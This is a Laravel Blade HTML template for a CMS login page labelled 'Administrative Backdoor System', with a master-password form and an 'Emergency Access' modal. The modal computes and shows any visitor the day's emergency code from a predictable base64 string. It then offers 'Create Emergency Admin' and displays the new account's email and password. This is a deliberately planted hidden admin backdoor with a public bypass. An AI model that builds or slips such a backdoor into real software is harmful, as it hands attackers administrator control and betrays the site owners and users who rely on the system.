<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Secure System Access</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .auth-container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            backdrop-filter: blur(10px);
        }
        
        .lock-icon {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .lock-icon svg {
            width: 60px;
            height: 60px;
            fill: #2a5298;
        }
        
        h1 {
            text-align: center;
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }
        
        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        label {
            display: block;
            color: #333;
            margin-bottom: 8px;
            font-weight: 500;
        }
        
        input[type="password"], input[type="text"] {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e1e5e9;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: #f8f9fa;
        }
        
        input[type="password"]:focus, input[type="text"]:focus {
            outline: none;
            border-color: #2a5298;
            background: #fff;
            box-shadow: 0 0 0 3px rgba(42, 82, 152, 0.1);
        }
        
        .btn-access {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #2a5298 0%, #1e3c72 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        
        .btn-access:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(42, 82, 152, 0.3);
        }
        
        .btn-access:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        
        .error-message {
            color: #dc3545;
            background: #f8d7da;
            padding: 12px;
            border-radius: 6px;
            margin-bottom: 20px;
            border-left: 4px solid #dc3545;
            font-size: 14px;
        }
        
        .success-message {
            color: #155724;
            background: #d4edda;
            padding: 12px;
            border-radius: 6px;
            margin-bottom: 20px;
            border-left: 4px solid #28a745;
            font-size: 14px;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin-top: 15px;
        }
        
        .loading .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #2a5298;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 10px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .warning-text {
            color: #856404;
            background: #fff3cd;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 20px;
            border-left: 4px solid #ffc107;
            font-size: 12px;
        }
        
        .emergency-link {
            text-align: center;
            margin-top: 25px;
        }
        
        .emergency-link a {
            color: #dc3545;
            text-decoration: none;
            font-size: 12px;
            font-weight: 500;
        }
        
        .emergency-link a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="auth-container">
        <div class="lock-icon">
            <svg viewBox="0 0 24 24">
                <path d="M18,8A2,2 0 0,1 20,10V20A2,2 0 0,1 18,22H6A2,2 0 0,1 4,20V10A2,2 0 0,1 6,8H7V6A5,5 0 0,1 12,1A5,5 0 0,1 17,6V8H18M12,3A3,3 0 0,0 9,6V8H15V6A3,3 0 0,0 12,3Z"/>
            </svg>
        </div>
        
        <h1>Secure Access</h1>
        <p class="subtitle">Administrative Backdoor System</p>
        
        <div class="warning-text">
            ⚠️ This is a secure administrative interface. All access attempts are logged and monitored.
        </div>
        
        <form id="authForm">
            @csrf
            <input type="hidden" id="securityToken" value="{{ $token }}">
            <input type="hidden" id="timestamp" value="{{ $timestamp }}">
            
            <div class="form-group">
                <label for="masterPassword">Master Password</label>
                <input type="password" id="masterPassword" name="master_password" required autocomplete="off">
            </div>
            
            <button type="submit" class="btn-access" id="submitBtn">
                🔓 ACCESS SYSTEM
            </button>
        </form>
        
        <div id="messageContainer"></div>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <span>Authenticating...</span>
        </div>
        
        <div class="emergency-link">
            <a href="#" onclick="showEmergencyAccess()">Emergency Access</a>
        </div>
    </div>

    <!-- Emergency Access Modal -->
    <div id="emergencyModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center;">
        <div style="background: white; padding: 30px; border-radius: 10px; max-width: 400px; width: 90%;">
            <h2 style="color: #dc3545; margin-bottom: 20px;">🚨 Emergency Access</h2>
            <p style="margin-bottom: 20px; color: #666;">Emergency access is for critical situations only. Today's emergency code:</p>
            <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 14px; margin-bottom: 20px;">
                Emergency Code: <strong id="emergencyCode"></strong>
            </div>
            <form id="emergencyForm">
                <div style="margin-bottom: 15px;">
                    <label>Emergency Code:</label>
                    <input type="text" id="emergencyCodeInput" style="width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ddd; border-radius: 4px;">
                </div>
                <div style="margin-bottom: 15px;">
                    <label>Action:</label>
                    <select id="emergencyAction" style="width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ddd; border-radius: 4px;">
                        <option value="create_emergency_admin">Create Emergency Admin</option>
                        <option value="reset_all_failed_logins">Reset All Failed Logins</option>
                    </select>
                </div>
                <div style="display: flex; gap: 10px;">
                    <button type="submit" style="flex: 1; padding: 10px; background: #dc3545; color: white; border: none; border-radius: 4px;">Execute</button>
                    <button type="button" onclick="hideEmergencyAccess()" style="flex: 1; padding: 10px; background: #6c757d; color: white; border: none; border-radius: 4px;">Cancel</button>
                </div>
            </form>
            <div id="emergencyResult" style="margin-top: 15px;"></div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('authForm');
            const submitBtn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');
            const messageContainer = document.getElementById('messageContainer');
            
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const masterPassword = document.getElementById('masterPassword').value;
                const securityToken = document.getElementById('securityToken').value;
                const timestamp = parseInt(document.getElementById('timestamp').value);
                
                if (!masterPassword) {
                    showMessage('Please enter the master password', 'error');
                    return;
                }
                
                showLoading(true);
                
                try {
                    const response = await fetch('{{ route("secure.backdoor.authenticate") }}', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
                        },
                        body: JSON.stringify({
                            master_password: masterPassword,
                            security_token: securityToken,
                            timestamp: timestamp
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (data.success) {
                        showMessage('Access granted! Redirecting...', 'success');
                        // Store session ID and redirect
                        sessionStorage.setItem('backdoor_session', data.session_id);
                        setTimeout(() => {
                            window.location.href = '{{ route("secure.backdoor.dashboard") }}?session_id=' + data.session_id;
                        }, 1500);
                    } else {
                        showMessage(data.message || 'Access denied', 'error');
                        document.getElementById('masterPassword').value = '';
                    }
                } catch (error) {
                    showMessage('Connection error. Please try again.', 'error');
                }
                
                showLoading(false);
            });
        });
        
        function showLoading(show) {
            const loading = document.getElementById('loading');
            const submitBtn = document.getElementById('submitBtn');
            
            loading.style.display = show ? 'block' : 'none';
            submitBtn.disabled = show;
        }
        
        function showMessage(message, type) {
            const container = document.getElementById('messageContainer');
            const className = type === 'error' ? 'error-message' : 'success-message';
            container.innerHTML = `<div class="${className}">${message}</div>`;
        }
        
        function showEmergencyAccess() {
            const modal = document.getElementById('emergencyModal');
            const codeElement = document.getElementById('emergencyCode');
            
            // Generate today's emergency code (same logic as backend)
            const today = new Date().toISOString().split('T')[0];
            const emergencyString = 'EMERGENCY_BOKOD_CMS_2025_' + today;
            
            // Simple hash simulation for display (not actual validation)
            codeElement.textContent = btoa(emergencyString).substr(0, 16).toUpperCase();
            
            modal.style.display = 'flex';
        }
        
        function hideEmergencyAccess() {
            document.getElementById('emergencyModal').style.display = 'none';
        }
        
        document.getElementById('emergencyForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const emergencyCode = document.getElementById('emergencyCodeInput').value;
            const action = document.getElementById('emergencyAction').value;
            const resultDiv = document.getElementById('emergencyResult');
            
            try {
                const response = await fetch('{{ route("secure.backdoor.emergency") }}', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
                    },
                    body: JSON.stringify({
                        emergency_code: emergencyCode,
                        action: action
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    let message = data.message;
                    if (data.credentials) {
                        message += '<br><strong>Login:</strong> ' + data.credentials.email + '<br><strong>Password:</strong> ' + data.credentials.password;
                    }
                    resultDiv.innerHTML = '<div style="color: green; padding: 10px; background: #d4edda; border-radius: 4px;">' + message + '</div>';
                } else {
                    resultDiv.innerHTML = '<div style="color: red; padding: 10px; background: #f8d7da; border-radius: 4px;">' + data.message + '</div>';
                }
            } catch (error) {
                resultDiv.innerHTML = '<div style="color: red; padding: 10px; background: #f8d7da; border-radius: 4px;">Connection error</div>';
            }
        });
        
        // Auto-focus password field
        document.getElementById('masterPassword').focus();
    </script>
</body>
</html>